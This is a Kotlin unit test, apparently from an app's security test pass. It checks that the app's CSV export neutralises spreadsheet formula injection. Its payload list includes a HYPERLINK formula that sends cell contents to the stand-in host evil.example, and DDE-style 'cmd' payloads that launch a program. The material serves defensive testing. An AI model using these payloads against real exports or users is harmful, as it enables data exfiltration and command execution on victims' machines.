package com.privacyguard.sectest

import com.privacyguard.app.ui.statistics.StatisticsViewModel
import org.junit.Assert.assertFalse
import org.junit.Test

/**
 * Security test pass (2026-10-14): app labels and SNI hosts are attacker-chosen and
 * end up in the CSV export. A field that starts with = + - @ (or tab / CR) is
 * evaluated as a formula by Excel, LibreOffice and Google Sheets even when quoted.
 */
class ExportInjectionTest {

    private fun csvEscape(value: String): String {
        val unsafe = sun.misc.Unsafe::class.java.getDeclaredField("theUnsafe")
            .apply { isAccessible = true }.get(null) as sun.misc.Unsafe
        // The real private extension function, on an instance built without its constructor.
        val vm = unsafe.allocateInstance(StatisticsViewModel::class.java)
        val m = StatisticsViewModel::class.java.getDeclaredMethod("csvEscape", String::class.java)
            .apply { isAccessible = true }
        return m.invoke(vm, value) as String
    }

    @Test
    fun formulaPrefixesAreNeutralised() {
        val payloads = listOf(
            "=HYPERLINK(\"https://evil.example/?d=\"&A2,\"Open report\")",
            "+cmd|' /C calc'!A0",
            "-2+3+cmd|' /C calc'!A0",
            "@SUM(1+1)*cmd|' /C calc'!A0",
            "\t=1+1",
        )
        val unsafeCells = payloads.map { it to csvEscape(it) }.filter { (_, cell) ->
            val inner = cell.removePrefix("\"")
            inner.firstOrNull() in setOf('=', '+', '-', '@', '\t', '\r')
        }
        unsafeCells.forEach { (p, cell) -> println("formula survives CSV export: $p -> $cell") }
        assertFalse("CSV formula injection: ${unsafeCells.size}/${payloads.size} payloads exported as formulas", unsafeCells.isNotEmpty())
    }
}
